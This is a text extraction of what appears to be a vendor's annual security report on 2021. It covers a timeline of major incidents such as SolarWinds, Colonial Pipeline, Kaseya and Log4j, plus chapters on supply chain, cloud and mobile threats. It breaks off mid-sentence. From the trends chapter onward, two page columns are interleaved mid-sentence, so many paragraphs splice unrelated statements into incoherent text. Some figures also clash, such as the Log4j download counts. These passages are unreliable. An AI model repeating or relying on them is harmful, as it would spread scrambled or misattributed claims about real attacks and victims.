YOUDESERVETH EB ESTSECURIT Y2CHECK POINT SOFTWARE\|SECURITY REPORT 2022C ONTENT S0507
1231
34CHAPTER 1: INTRODUCTION TO THE CHECK POINT
2022 SECURIT Y REPORTCHAPTER 2: TIMELINE OF 2021'S MA JOR CYBER E VENTSCHAPTER 3: 2021S CYBER SECURIT Y TRENDS1317From SolarWinds to Log4jThe Fallout of Cyber Attacks21Cloud Services Under Attack25Mobile Arena Developments28Cracks in the Ransomware EcosystemCHAPTER 4: MALWARE SPOTLIGHT: EMOTETS RETURNCHAPTER 5: GLOBAL STATISTICS41Global Malware Statistics43Global Analysis of Top Malware45Botnet Global Analysis47Infostealer Malware Global Analysis49Cryptominers Global Analysis51Banking Trojans Global Analysis53Mobile Malware Global Analysis3CHECK POINT SOFTWARE\|SECURITY REPORT 202254CHAPTER 6: HIGH PROFILE GLOBAL VULNER ABILITIES5556Log4Shell Apache Log4jRemote Code Execution
(CVE\-2021\-44228\)ProxyLogon Microsoft Exchange Server \- Authentication Bypass 
(CVE\-2021\-26855\)56Atlassian Confluence \- Remote Code Execution(CVE\-2021\-26084\)59CHAPTER 7: PRE VENTING THE NEX T CYBER PANDEMIC
A STR ATEGY FOR ACHIE VING BET TER SECURIT Y60Threat preventionprevent attacks before they happen60When your perimeter is everywhere and attacks keep advancing,your business needs accurate prevention based on real time threat 
intelligence6161Secure everything, as everything is a potential targetLeveraging a complete unified architecture62Maintain security hygiene64Conclusion65APPENDIX: MALWARE FAMILY DESCRIPTIONS4CHECK POINT SOFTWARE\|SECURITY REPORT 2022C HAPTE R101INTRODUCTION
TO THE CHECK POINT
2022 SECURITY REPORT THE PAST TWELVE MONTHS REPRESENTS ONE OF THEMOST TURBULENT AND DISRUPTIVE PERIODS ON RECORD,AT LEAST AS FAR AS SECURITY IS CONCERNED.55CHECK POINT SOFTWARE\|SECURITY REPORT 2022CHECK POINT SOFTWARE\|SECURITY REPORT 202201C HAPTE R1M AY AH OROWITZ 
VP Research, Check PointThe past twelve months represents one of the most turbulent and disruptive periodson record, at least as far as security is concerned. As governments and businessesaround the world continued to navigate the uncharted waters of a global pandemic,the so\-called new normal still felt a long way off. Digital transformation effortswere dramatically accelerated as businesses embraced hybrid and remote workingarrangements, but the same questions around security maturity that plagued manybusinesses in 2020 persisted through 2021\. While some of those questions remainup in the air, threat actors have wasted no time whatsoever in turning the situationto their advantage. Cyberattacks are up by an average of 50% since we issued ourlast annual report, with the education and research sector suffering the biggestblow, averaging 1,605 attacks every single week throughout the year. As predicted,the infamous SolarWinds breach appears to have kickstarted a trend of supply chainattacks that have persisted throughout the year, showing no signs of slowing down.In this 2022 Security Report, we will reveal the key attack vectors and techniquesthat our researchers here at Check Point Software have observed over the past year.From a new generation of highly sophisticated supply chain attack methods, rightthrough to the Log4j vulnerability exploit that rendered hundreds of thousands ofbusinesses open to a potential breach.Well start with a month\-by\-month rundown of the years major cyber events, beforedoing a deep dive into some of the emerging trends that will undoubtedly shape theyear to come. Well discuss cloud services, developments in the mobile landscapeand IoT, cracks in the ransomware ecosystem, the return of Emotet, and, of course,the Log4J zero\-day vulnerability that punctuated an already busy year.66CHECK POINT SOFTWARE\|SECURITY REPORT 2022CHECK POINT SOFTWARE\|SECURITY REPORT 2022C HAPTE R202TIMELINE
OF 2021'S MAJOR
CYBER EVENTS IN 2021, WE WITNESSED AN UNUSUALLY HIGH NUMBER OFATTACKS THAT LED TO DISRUPTIONS TO INDIVIDUALSDAY\-TO\-DAYLIVES, AND IN SOME CASES EVEN THREATENED THEIR SENSE OFPHYSICAL SECURITY.77CHECK POINT SOFTWARE\|SECURITY REPORT 2022CHECK POINT SOFTWARE\|SECURITY REPORT 2022JAN01FEB02MAR03In January, the US Department of Justice confirmed that it had been affected by the 
Solarwinds supply\-chain attack, and that 3% of its employee email boxes had been 
accessed in order to steal sensitive data. The department has more than 100,000 
employees across a series of law enforcement agencies, including the FBI, the Drug 
Enforcement Agency, and the US Marshals Service. The Department of Justice was a 
buyer of SolarWinds Orion, a tool that was used by hackers to execute this attack, leading 
to as many as 18,000 SolarWinds customers experiencing a breach. The Department 
of Justice said it learned it was a victim on Christmas Eve, revealing that a small 
percentage of its Microsoft Office 365 email accounts had been compromised.In February, popular music streaming platform, Spotify, was hit by a credential\-stuffing 
attack, only three months after experiencing a similar incident. The attack used stolen 
credentials from 100,000 user accounts and leveraged a malicious Spotify login database. 
The attack was reported to Spotify, which prompted the company to issue a password 
reset to affected users that rendered the stolen credentials invalid. The company said 
in a statement that it also worked to have the fraudulent database taken down by its 
internet service provider, and noted that the attack was not linked to a breach in Spotify's 
own security. Cybercriminals carrying out credential\-stuffing exploit people who reuse 
the same passwords across multiple online accounts and platforms. Attackers simply 
build automated scripts that systematically try stolen IDs and passwords against various 
types of accounts.On March 2nd, 2021, Volexity reported the in\-the\-wild exploitation of the Microsoft 
Exchange Server vulnerabilities, CVE\-2021\-26855, CVE\-2021\-26857, CVE\-2021\-26858,
and CVE\-2021\-27065\. Further investigation uncovered that an attacker was exploiting 
a zero\-day used in the wild. The attacker was using the vulnerability to steal the full 
contents of several user mailboxes. This vulnerability is remotely exploitable and does 
not require authentication, special knowledge or access to a specific environment. It was 
estimated that 250,000 servers fell victim to the attacks, including servers belonging 
to around 30,000 organizations in the United States and 7,000 servers in the United 
Kingdom. The European Banking Authority, the Norwegian Parliament, and Chile's 
Commission for the Financial Market (CMF) were also impacted.8CHECK POINT SOFTWARE\|SECURITY REPORT 2022APR04MAY05JUN06In April, the US National Security Agency (NSA), the Cybersecurity and Infrastructure 
Security Agency (CISA), and the Federal Bureau of Investigation (FBI) published a 
joint advisory warning that a Russia\-linked APT group, APT29, was exploiting five 
vulnerabilities in an ongoing attack against US targets. According to the advisory, 
Russian Foreign Intelligence Service (SVR) actors (also known as APT29, Cozy Bear, 
and The Dukes) frequently used publicly known vulnerabilities to conduct widespread 
scanning and exploitation against vulnerable systems in an effort to obtain authentication 
credentials to allow further access. Recent Russian SVR activities include compromising 
SolarWinds Orion software updates, targeting COVID\-19 research facilities through 
deploying WellMess malware, and leveraging a VMware vulnerability that was a zero\-day 
at the time.In May, a ransomware attack shut down the routine operations of Colonial Pipeline, 
which carries 45% of the fuel consumed in the US East Coast, including diesel, petrol 
and jet fuel. The alleged Russian DarkSide ransomware criminal group, was behind the 
attack. Colonial Pipeline is the largest refined products pipeline in the US, a 5,500 mile 
(8,851 km) system involved in transporting over 100 million gallons from the Texas city 
of Houston to New York Harbor. DarkSide uses Ransomware\-as\-a\-Service (RaaS) model, 
where it relies on affiliate program to execute its cyber attacks. Colonial Pipeline paid a 
ransom demand of close to US$ 5 million in return for a decryption key. Later on, the FBI 
declared it had retrieved the private key of the ransom account and recovered 63\.7 of the 
bitcoins paid.JBS, the US\-based meat processing giant, was hit by a ransomware attack in June 
affecting its North American and Australian operations. The FBI attributed the attack to 
the REvil ransomware group. The attack forced JBS to temporarily shut down all of its 
beef plants in the United States. One of its Canadian plants was also affected, and the 
company paused beef and lamb kills in Australia until the plants were back online. On 
June 9, JBLs Chief Executive in the US revealed the company had paid US$ 11 million to 
hackers in a very painful but necessary decision, despite the fact that the company was 
able to restore most of its systems from its own backups.9CHECK POINT SOFTWARE\|SECURITY REPORT 2022JUL07AUG08SEP09In July, the REvil ransomware group targeted multiple Managed Service Providers 
(MSPs) and their customers in a supply chain attack. Threat actors successfully 
implanted a malicious software update for IT Company Kaseyas VSA patch management 
and client monitoring tool, which included the malware installer. An estimated 1,000 
companies were impacted by the attack. The massive supply chain attack carried out by 
REvil over the 4th of July weekend impacted numerous Kaseya customers with millions 
of USD demanded in ransom. Kaseya issued a security advisory on their site, warning 
all customers to immediately shut down their VSA server to prevent the spread of the 
attack while they investigated. In order to breach on\-premise Kaseya VSA servers, REvil 
used a zero\-day vulnerability that was in the process of being fixed. The vulnerability had 
been previously disclosed to Kaseya by security researchers from the Dutch Institute 
for Vulnerability Disclosure (DIVD), and Kaseya was validating the patch before rolling 
it out to customers. However, the REvil ransomware gang was one step ahead of Kaseya 
and used the vulnerability to carry out their attack, with ransoms ranging from US$ 45K 
to US$ 5 million. With the attack on Kaseya VSA servers, REvils affiliate was initially 
targeting Kaseyas MSSPs, with a clear intent to propagate to the MSSP customers. The 
attack amplified exponentially from the MSSP to the actual customers.The largest ever distributed denial of service (DDoS) attack was detected in August, 
with 17\.2 million requests\-per\-second. The attack was facilitated by the Mirai botnet, 
targeting an organization in the financial industry. In this specific incident, the traffic 
originated from more than 20,000 bots in 125 countries worldwide, with almost 15% of 
the attack originating from Indonesia, followed by India, Brazil, Vietnam, and Ukraine. 
Mirai was first observed in 2016 targeting Internet of Things (IoT) devices, such as CCTV 
cameras and routers. Numerous variants of the botnet have emerged since, expanding 
the list of targeted devices to include Linux routers and servers, Android devices, and more.Check Point Research saw a global surge in the black market for fake COVID\-19 
vaccine certificates on Telegram, following US President Bidens vaccine mandate 
announcements. The black market expanded to serve 28 countries, including Austria, 
UAE, Brazil, UK, Singapore and more. The price for fake vaccine certificates also jumped 
globally, including in the US, where it doubled from US$ 100 to US$ 200\.10CHECK POINT SOFTWARE\|SECURITY REPORT 2022OCT10NOV11DEC12In October, the infrastructure of the Russia\-based REvil ransomware gang, responsible 
for numerous ransomware attacks, was compromised and forcibly taken\-down for the 
second time in three months, bringing their operation to a halt. This comes after REvils 
leaks website Happy Blog was previously shut down in July (along with the suspicious 
disappearance of one of REvil gang leaders UNKN), and after it was brought back up 
again during September, by one of its remaining gang leaders. REvil ransomware became 
notorious during 2021 with a series devastating attacks, especially after their successful 
ransom of the JBS food company, for US$ 11 million, and their later compromise of 
Kaseya \- a US software management company, in July. These increasingly devastating 
attacks were matched by an increased pressure from authorities, and the launch of an 
offensive attack against REvils infrastructure and its members.On November 14, Emotet, one of the most infamous botnets in history, rose from the 
dead after it was taken down ten months earlier, by a joint international law enforcement 
operation. Emotet used the Trickbot botnet to jump\-start its operation, when machines 
already infected with the Trickbot Trojan, started to download and execute the latest 
version of Emotet. Emotet itself came back even stronger than before, with some new 
additions to its toolbox, such as an updated encryption scheme, control\-flow obfuscations 
and new delivery methods.On December 9th, an acute remote code execution (RCE) vulnerability was reported in 
the Apache logging package Log4j 2 versions 2\.14\.1 and below (CVE\-2021\-44228\). Apache 
Log4j is the most popular java logging library with over 400,000 downloads from its 
GitHub project. It is used by a vast number of companies worldwide, enabling logging 
in a wide set of popular applications. Exploiting this vulnerability is simple. The Log4j 
library is embedded in almost every internet service or application we are familiar with, 
including Twitter, Amazon, Microsoft, Minecraft and more. Since the outbreak, Check 
Point Research witnessed what looks like an evolutionary repression, with new variations 
of the original exploit being introduced rapidly \- over 60 in less than 24 hours. This was 
clearly one of the most serious vulnerabilities on the internet in recent years.11CHECK POINT SOFTWARE\|SECURITY REPORT 2022C HAPTE R3032021S
CYBER SECURITY TRENDS THROUGHOUT 2021, SOFTWARE SUPPLY CHAIN ATTACKS GREW INBOTH FREQUENCY AND SCALE. RESEARCHERS CONCLUDED THATSOFTWARE SUPPLY\-CHAIN ATTACKS INCREASED BY NO LESSTHAN 650% THROUGHOUT THE YEAR.12CHECK POINT SOFTWARE\|SECURITY REPORT 2022C HAPTE R3FROM SOLARWINDS TO LOG4JThe infamous SolarWinds supply chain attack was revealed in December 2020, but its influenceon the cloud attack landscape, with particular regard to supply chain attacks, has led to itsinclusion in our report once again. The SolarWinds incident originated with a sophisticatedmalware, Sunburst, incorporated into several compromised versions of an IT resourcemanagement product named SolarWinds Orion, used by 33,000 customers worldwide. Themalicious update, attributed to the Russian Intelligence agency\-affiliated threat group calledNobelium, found its way to around 18,000 corporations, successfully infecting approximately425 companies on the Fortune 500 list, as well as US government departments including theDepartment of Homeland Security and the Treasury Department.LOTE MF INKELSTEE NDirector, 
 Threat Intelligence
\& ResearchThe SolarWinds attack was very much a milestonemoment for the security community, not just becauseof the scale of the attack, but because the techniquethat was used revealed new levels of sophisticationthat increased the threat of supply chain attacks moregenerally. The SolarWinds breach set a new tone and, aspredicted, weve seen the number of software supply\-chain incidents grow in its wake. This past year, weveseen the number of incidents increase six\-fold, and thereare yet again signs that businesses arent prepared todeal with the threat.13CHECK POINT SOFTWARE\|SECURITY REPORT 2022C HAPTE R3As detailed in our previous report, beyondNaturally, prominent APT groups are an integralits unprecedented scale, SolarWinds mainpart of the trend. The North Korean Lazarusinnovation lies in its technique. In order to gaingroup recently began targeting IT serviceaccess to an organizations sensitive Microsoftproviders to launch supply chain attacks,365 resources, the attackers first used a forgedand a new backdoor called BLINDINGCANtoken to compromise the local and on\-premisehas already been used to target a Latvian ITnetworks, before moving laterally to the cloudvendor and a South Korean software company.environment. Today, we can clearly state thatAdditional incidents include an attack againstthe SolarWinds attack laid the foundations for aa CCTV vendor carried out by an affiliate of therapid surge in supply chain attacks.DarkSide ransomware gang, in which the actorsThroughout 2021, software supply chain attacksgrew in both frequency and scale. Researcherscompromised the vendors website to infect itsclients with ransomware.concluded that software supply\-chain attacksOne of the most significant supply chainincreased by no less than 650% throughoutattacks of 2021, also featuring ransomwarethe year. A study issued by the European Uniondelivery, targeted Kaseya, a global provider ofAgency for Cybersecurity (ENISA) reviewedIT management software for managed servicetwo dozen incidents and found that 66% ofproviders (MSPs) and IT teams. The attacksupply chain attacks were committed bywas carried out by a member of the affiliatesexploiting an unknown vulnerability, while onlyprogram of the REvil ransomware group.16% leveraged known software flaws. MostAccording to the Kaseya CEO, less than 0\.1% ofattacks actually targeted software code. Thisthe companys customers were accessed, but asyear, it seems that organizations were oncesome of Kaseyas clients are MSPs themselves,again caught largely unprepared, as a surveyas many as 1,500 companies were affectedconcluded that 82% of companies designate theby the attack. The threat actors cleverlythird party vendors that make up their softwareexploited a vulnerability affecting Kaseyassupply chain with highly privileged roles. 76%internet\-facing VSA servers. VSA is a remote\-provide roles that could allow account takeover,monitoring tool commonly used by MSPs for theand, worst of all, over 90% of designated securitymanagement of network and endpoint devices.teams were not aware that such permissionsWhen the attack was discovered by Kaseya, thewere even granted.company urged its customers to shut down theirVSA servers.1414CHECK POINT SOFTWARE\|SECURITY REPORT 2022CHECK POINT SOFTWARE\|SECURITY REPORT 2022C HAPTE R3In late October, the popular NPM package ua\-parser\-js, with millions of weekly downloads,was compromised by attackers. For a periodof four hours, the actors managed to take overthe developers NPM account and insertedmalicious code into three versions of the NPMlibrary. The library, which is used to parseuser agent strings and identify its browser,operating system, CPU and more, is used inthousands of projects, including ones ownedby Facebook, Microsoft, Amazon, Google andSlack. Therefore, the supply chain attack, inwhich compromised packages of the librarywere distributed instead of the legitimate one,enabled threat actors to install malware on alarge number of infected devices. In this case,Linux and Windows devices were infected withcrypto\-miners and password\-stealers.Another prominent incident took place inNovember, when multiple Greek shippingcompanies were hit by ransomware. This wasafter a common IT service provider, DanaosManagement Consultants, was compromised ina supply chain attack. The incident crippled theshipping companies communication channels,interrupting contact with other ships, suppliers,and agents, and also led to data loss.This year, the group behind the SolarWindsattack itself resumed activity, utilizing theapproach developed for the first attack andfocusing yet again on companies that are partof the global IT supply chain. However, thistime, a different part of the chain is beingtargeted, namely cloud resellers and techservice providers. These companies customize,implement, and manage cloud services for theircustomers. The threat group clearly relies onthese companies direct access to their clientsenvironments to obtain access to their fullclient lists in a single strike, impersonating atrusted partner. The operation has been takingplace since May 2021 and has already impactedmore than 140 resellers and providers,compromising 14 of them. Throughout thesecond half of the year, the Nobelium threatgroup has been highly active, but with a lowersuccess rate due to growing awareness. Thegroup utilizes multiple tactics, including theuse of stolen credentials obtained via aninfo\-stealer campaign by a third\-party actor,leveraging application impersonation privilegesto collect protected mail data, and abuse multi\-factor authentication (MFA). The recent attackwave may signal a growth in the resourcesinvested by the Russian state\-sponsored groupin the field of supply chain operations, as ameans to establish persistent access to targetsof interest to the Russian government.1515CHECK POINT SOFTWARE\|SECURITY REPORT 2022CHECK POINT SOFTWARE\|SECURITY REPORT 2022C HAPTE R3Just when we thought we had finishedDue to the scale of the distribution of thesummarizing the Supply Chain landscape forlibrary, Log4Shell is referred to as the most2021, the Log4j zero\-day vulnerability wascritical vulnerability of 2021, with the full scopeexposed. The Apache logging package Log4j isof the damage yet to be determined. The Apachethe most popular Java logging library with overFoundation released a patch for the RCE400,000 daily downloads, and is incorporatedvulnerability, but nevertheless, mass scanninginto millions of Java\-based applicationsof vulnerable servers has been observed byworldwide. Companies using Log4j as a loggingmultiple security vendors. The exploit rate ofpackage include Cisco, Twitter, Cloudflare,the Log4j flaw has been unusually high sinceTesla, Amazon, Apple and more. The Log4jshortly after its exposure. Check Pointpackage logs error messages; according to theResearch detected approximately 40,000 attackApache Foundation advisory, an attacker whoattempts 2 hours after the Log4j vulnerabilitycan control log messages or their parameterswas revealed and 830,000 attack attempts 72could execute arbitrary code from an externalhours into the event.server via multiple protocols when messagelookup substitution is enabled. Only a singlestring of text is needed to exploit the flaw.Since its discovery on December 9, theThe vulnerability could potentially allowthreat actors to access any system using thelibrary, including systems that are used tomanage client networks and resources. TheLog4Shell flaw, has been actively exploited inpotential damage that could be caused by thisthe wild. The vulnerability, assigned CVE\-2021\-one vulnerability in an open source library44228, could allow an unauthenticated attackerdemonstrates the immense risk posed byto execute malicious code or take over anysoftware supply chains, especially in casessystem that uses the vulnerable version of anwhere an underfunded project, run by severalopen\-source library. Unsurprisingly, it scored apart\-time volunteers, is a key component thatperfect 10 out of 10 in the CVSS rating system.thousands of multi\-million computer systemsrely on worldwide.1616CHECK POINT SOFTWARE\|SECURITY REPORT 2022CHECK POINT SOFTWARE\|SECURITY REPORT 2022C HAPTE R3O ME RD EMBINSK YGroup Manager, 
Data ResearchAs outlined in our mid\-year report, incidents ofcyberattacks are increasing across the board as threatactors take advantage of changing circumstancesand hurried digital transformation efforts. As of thisreport, Cyberattacks are up by an average of 50% whencompared with last year's data, but the education andresearch sectors appear to have suffered the greatestblow, weathering an average of 1,605 attackson a weekly basis.THE FALLOUT OF CYBER ATTACKSIts no secret that a cyberattack, whether targeted or widely distributed, can have a dramaticimpact on organizational performance, data integrity, customer success, long\-term reputationand, of course, finances. Naturally, attacks targeting critical infrastructure can paralyze anorganizations routine as well as its entire supply chain. In 2021, we witnessed an unusually highnumber of attacks that led to disruptions to individuals day\-to\-day lives, and in some caseseven threatened their sense of physical security. Whether they are financially or ideologicallydriven, threat actors are constantly looking for additional leverage and new ways to increasethe pressure placed on their victims.1717CHECK POINT SOFTWARE\|SECURITY REPORT 2022CHECK POINT SOFTWARE\|SECURITY REPORT 2022C HAPTE R3One of this years most significant attacks,the FBI to investigate. In Australia, somewhich perfectly demonstrates the above, is aabattoirs were completely shut down, forcingransomware incident that took place in May. Thethe company to furlough 7,000 employees.operation targeted the Colonial Pipeline fuelEventually, with the fear of price inflationcompany which delivers fuel to the Southeastcombined with massive unemployment, the CEOcoast of the United States. The incident forcedof JBS USA, a subsidiary of JBS S.A announcedthe company to shut down their operations,that the company paid the cybercriminals aincreasing gasoline prices and causing a majorransom equivalent to US$ 11 million in BTC.supply shortage on the East Coast. This chainof events eventually triggered a rush of panicbuying as many gas stations completely ranout of fuel. Government officials pleaded withthe public not to rush to gas stations, as peoplewere actually attempting to fill plastic bags withgasoline to avoid running out. A single day afterthe attack took place, Colonial Pipeline had nochoice but to pay the US$ 5 million ransom tothe DarkSide ransomware gang who led theattack in order to unlock their systems.The education sector was also heavily impacted.In 2021, it was the most targeted sectorglobally, with a 75% increase compared to 2020and an average of almost 1,605 attack weeklyattempts per organization. The disruptionsuffered by educational institutions impactedstudents, professors and other staff members.Howard University in Washington D.C fell victimto a ransomware attack in September andwas forced to suspend classes to conduct athorough investigation of their network togetherIn the same month, JBS S.A, the worlds largestwith an audit of the student and staff devices.meat processing company, fell victim to anSimilarly, The Lewis and Clark Communityattack by the REvil ransomware group. TheCollege in Illinois was hit by a ransomwareBrazilian company distributes meat productsattack in November that affected their onlinemade in 150 industrial plants in 15 countries,learning platform as well as other criticaland has approximately 150,000 employeessystems. They had to close all their campuses,worldwide. The attack that hit the companyand cancel extra\-curricular activities includingnetwork impacted slaughterhouses and meatsporting events taking place in their facilities.supplies in the US, Canada and Australia andThe FBI released an alert against the PYSAcaused more than 3000 workers shifts to beransomware that targets higher educationcanceled. All of its US beef plants and meatinstitutions in the US and the UK.packing facilities, responsible for almost aquarter of American meat supplies, ceasedproduction while The White House assigned1818CHECK POINT SOFTWARE\|SECURITY REPORT 2022CHECK POINT SOFTWARE\|SECURITY REPORT 2022C HAPTE R3Finally, in mid\-2021, the Grief ransomwareIsrael, with a custom ransomware. The attackattacked several school districts in the US,incapacitated computers and some of theamong them a school district in Mississippi.hospital infrastructure, making dischargingThe ransomware stole 10GB of data includingand processing patients impossible due to thepersonal and professional information, andinability to retrieve patient files and registerhas threatened to publish the data unless it isnew ones. In December, the Behavioral Healthpaid. Institutions of higher learning such asGroup (BHG), which maintains over 80 Opioiduniversities and colleges make good targets fortreatment clinics throughout the US, sufferedcyber\-criminals because their systems, whicha cyber\-attack that disrupted its network for aallow students and faculty to connect theirweek. In some centers, patients were preventedpersonal devices to the institutions network,from getting their prescribed take\-homearent fully protected.The healthcare sector has also been heavilytargeted by cybercriminals since the start ofthe pandemic, as hospitals, research facilitiesdosage of medicine to treat narcotic addictionas the computers were not available to printprescription labels, potentially harming theirsensitive anti\-addiction treatment.involved in the development of vaccines,Ideologically driven hackers also managed toand pharmaceutical companies all provecause public disruption, particularly in Iran.tempting targets due to the time\-sensitiveFirst, the Iranian railways infrastructure facednature of their work. In October, a devastatinga cyberattack back in July in which hackersransomware attack took place against thedisplayed messages about train delays orhealthcare system of Newfoundland andcancellations on information boards at stationsLabrador, Canada. As a result, employee andacross the country, urging passengers topatient data was stolen and key systems werecall a number (which belonged to the Iraniantaken down for more than a week, leadingSupreme Leader Ayatollah Khameneis office)to a delay in thousands of appointments,for more information. The attack severelyincluding chemotherapy, as almost all non\-disrupted train operations the same dayemergency services and procedures wereand spread fear and confusion among thecanceled within the province. That same month,public. Check Point Research investigatedwe witnessed one of the first ransomwareand attributed the attack to the Indra groupattacks against a hospital in the Middle East,which opposes the regime and has been activeas the Chinese group DeepBlueMagic targetedsince at least 2019, known for its use of wiperthe Hillel Yaffe Medical Center in Hadera,malware.1919CHECK POINT SOFTWARE\|SECURITY REPORT 2022CHECK POINT SOFTWARE\|SECURITY REPORT 2022C HAPTE R3In October, a massive cyber\-attack disruptedAll of the attacks described above had a4,300 Iranian gas stations, targeting thesubstantial impact on a particular target sectorelectronic cards system which allows peopleand region. They also gained a lot of mediato buy gas with government subsidies. On theattention, which naturally plays right into thescreen, consumers who tried to fill their tankhands of cybercriminals in their attempts tofound the notice cyberattack 64411, Iransplant fear and gain leverage over their victims.Supreme Leaders phone number (the same oneUnfortunately, as 2021 has demonstrated,exposed in the train attack). The incident causedcyberattacks often have a much wider effect ona great deal of disorder with long lines of peoplethe general population than the attackers mayat gas stations fearing shortages and suddenhave originally intended.price increases.2020CHECK POINT SOFTWARE\|SECURITY REPORT 2022CHECK POINT SOFTWARE\|SECURITY REPORT 2022C HAPTE R3CLOUD SERVICES UNDER ATTACKIn 2020, the global pandemic brought significant changes to the corporate workenvironment as well as corporate network architecture. Within those changes, both theshift to cloud\-based architecture meant to address the need for hybrid, remotely\-managed networks and the preference for as\-a\-service providers over traditionalsuppliers, have really stood out in terms of the scale of their adoption. Subsequently, in2021, it became clear that cloud environments were also growing in popularity amongend users. By mid\-year, Gartner had released its forecast stating that end\-user spendingon public cloud services was estimated to grow by 23% in 2021 to over US$ 332 billion,compared to US$ 270 billion in 2020 and US$ 242\.7 billion in 2019\. Enterprises are nowallocating large\-scale funds to multi\-cloud architectures, with Microsoft Azure and AWSleading in popularity, and Google Cloud Platform, IBM, VMWare and others dominating arespectable share of the market.I TA IG REENBER GVP, Product ManagementIts understandable that businesses are increasing theirdependence on the cloud, particularly as we move into apost\-pandemic new normal in which hybrid working willplay a key part for many sectors. But shifting productivityonto the cloud also means that businesses are relyingmore and more on vendors to manage their databases,proprietary code and organizational resources, manyof them with in\-house knowledge gaps that theyre nowworking hard to fill. Filling those gaps should be a numberone objective for businesses in 2022, helping them toleverage their relationship with cloud vendors to theirfullest potential in terms of security, compliance and risk.2121CHECK POINT SOFTWARE\|SECURITY REPORT 2022CHECK POINT SOFTWARE\|SECURITY REPORT 2022C HAPTE R3Naturally, organizations are becomingThe trend is led by the infamous OMIGOD flawincreasingly dependent on cloud vendors toattacks. In September, researchers found foursecurely manage their databases, proprietarycritical vulnerabilities in OMI (Open Managementcode, and organizational resources. TheseInfrastructure), one of Microsoft Azuresorganizations are now gradually filling in thesoftware agents that allows users to manageplatform and role management knowledgeconfigurations across remote and localgaps formed during the rapid shift to cloud\-environments. OMI is deployed on Azure Linuxbased environments during 2020, leadingVMs embedded into multiple Azure services andto better security and more comprehensiveis deployed automatically when some servicesadministration. IAM (Identity and Accessare enabled which makes these flaws highlyManagement) Role Assumption attacks,likely to be exploited. An estimated 65% of allaimed at elevating privileges after obtainingAzure customers are vulnerable, whichunauthorized access, however, continue to be atranslates to thousands of organizations andsignificant concern.As usual, threat actors continue to raceagainst the security research community,looking for new vulnerabilities and exploits.Since late 2021, we have witnessed a waveof attacks leveraging flaws in the servicesmillions of end\-point devices. OMIGOD flaws areeasy to exploit, as only a single request with theauthentication header removed, is needed.Together, the vulnerabilities could enable actorsto execute remote arbitrary code within avulnerable network and escalate to root privileges.of industry\-leading cloud service providersMicrosoft already issued a patch to address theto gain control over an organizations cloudflaws as part of their September 2021 release.infrastructure, or, potentially, the organizationsHowever, some researchers warned that theentire database which stores proprietary,companys automatic fix was ineffective forcustomer and financial information. The flawsseveral days, until it was repaired. Attacksunder discussion are not trust logic flaws leveraging these flaws, in particular thepermission\-based flaws that derive from the9\.8\-rated RCE flaw, assigned CVE\-2021\-38647,organizations role policy that are used byhave already been observed as of the time ofthreat actors to gradually escalate privilegesexposure and have increased rapidly ever since.within the environment. Instead, were dealingServers scanning for vulnerable devices spikedwith critical vulnerabilities in the cloudfrom around 10 to more than 100 during theinfrastructure itself, which can allow full takeoverfirst weekend alone. The notorious Mirai IoTof accounts or arbitrary code execution.(Internet\-of\-Things) botnet was one of the first2222CHECK POINT SOFTWARE\|SECURITY REPORT 2022CHECK POINT SOFTWARE\|SECURITY REPORT 2022C HAPTE R3to target vulnerable devices, and the malwareother clients Kubernetes clusters. Exploitationattempted to close port 5896 (the OMI SSL port)of the flaw consists of three stages, beginningto keep other actors from taking advantagewith container escape, which is a privilegeof the attack. Attacks aiming to deploy cryptoescalation technique for container environments.miners onto unpatched Linux devices were alsoAzurescape enables an attacker to gainobserved.Another alarming flaw in Microsoft Azurewas exposed a month earlier, in August. Thistime, the vulnerability, dubbed ChaosDB,was found in Azure Cosmos DB, a multi\-model NoSQL database used by some of thetop global businesses out there, such asCoca Cola, Skype, and Symantec, to managelarge\-scale databases including financialadministrative privileges over an entire clusterof containers. Thankfully, a patch was swiftlyreleased when the flaw was first exposed, butfurther action by ACI users is also required. Asof late 2021, no exploits were detected. The flaw,however, has raised awareness to the dangersposed by multi\-tenant cloud environments,common large\-scale infrastructures that hostmultiple organizations on a single platform.transaction information. The flaw enables anMicrosoft Azure is not the only service inactor to retrieve several internal keys used towhich security flaws were discovered in theobtain root privileges that eventually enablepast year. In June, researchers uncovered ait to manage the organizations databases andvulnerability in Googles Compute Engine (GCE),accounts. Simply put, by exploiting this flaw,an infrastructure\-as\-a\-service (IaaS) componentattackers can gain complete and unrestrictedof Google Cloud Platform which is used to createcontrol of the entire cloud resources of alland launch virtual machines on demand. TheAzure Cosmos DB clients.flaw enables an attacker to take over virtualYet another breach in Microsoft Azure wasdiscovered towards the end of the year. Theflaw, called Azurescape, affects AzuresContainer\-as\-a\-Service (CaaS) platform andrelies on a two\-year\-old vulnerability assignedCVE\-2019\-5736 in RunC, a container runtime.Uniquely, Azurescape is a cross\-accountvulnerability: it allows an attacker to break outof the breached environment and execute codeon environments belonging to other users in thesame public cloud service. This means that amalicious user of the Azure Container Instances(ACI) could potentially run arbitrary code onmachines due to a combination of factors,including the use of weak random numbers bythe ISC DHCP software. Exploitation of the flaw,achieved by impersonating the Metadata serverfrom the targeted VMs point of view, could allowactors to eventually login as the root user of theVM. Google issued a patch for the flaw almost ayear after it was first disclosed.2323CHECK POINT SOFTWARE\|SECURITY REPORT 2022CHECK POINT SOFTWARE\|SECURITY REPORT 2022C HAPTE R3Recent research also provides an in\-depthTo conclude, in 2021 cloud providerreview of a technique called HTTP headervulnerabilities became much more alarmingsmuggling and its potential use to attackthan they were previously. The vulnerabilitiesAWSs API Gateway and AWS Cognito, anexposed throughout the year have allowedauthentication provider. The researchattackers, for variable length timeframes,demonstrates how this technique could beto execute arbitrary code, escalate to rootleveraged to bypass restrictions and achieveprivileges, access mass amounts of privatecache poisoning.content and even cross between differentenvironments. In short, vulnerabilities in thecloud infrastructure itself have been exposed,that even the most vigilant and professionalcloud consumer could not have foreseen orprevented.Finally, in late 2021 researchers noticed apeculiar change in AWS permissions thatcould allow AWS support services to reada customers S3 bucket data, instead ofjust observing its metadata. This potentialprivacy flaw was made possible by a changeto the permissions of a mandatory role calledAWSServiceRoleForSupport, created toallow technical and administrative support.Eventually, the change was reverted and AWSstated that they will implement additionalsafeguards to prevent such misconfigurations inthe future.FPO2424CHECK POINT SOFTWARE\|SECURITY REPORT 2022CHECK POINT SOFTWARE\|SECURITY REPORT 2022C HAPTE R3MOBILE ARENA DEVELOPMENTSThroughout 2021, threat actors gradually increased their focus on mobile devices, for bothlarge\-scale end user campaigns and targeted enterprise attacks. A survey\-basedstudy revealed that implementation of the BYOD (Bring\-Your\-Own\-Device) policy in theworkplace, in which employees replace designated corporate devices with their ownpersonal devices, caught organizations unprepared, with 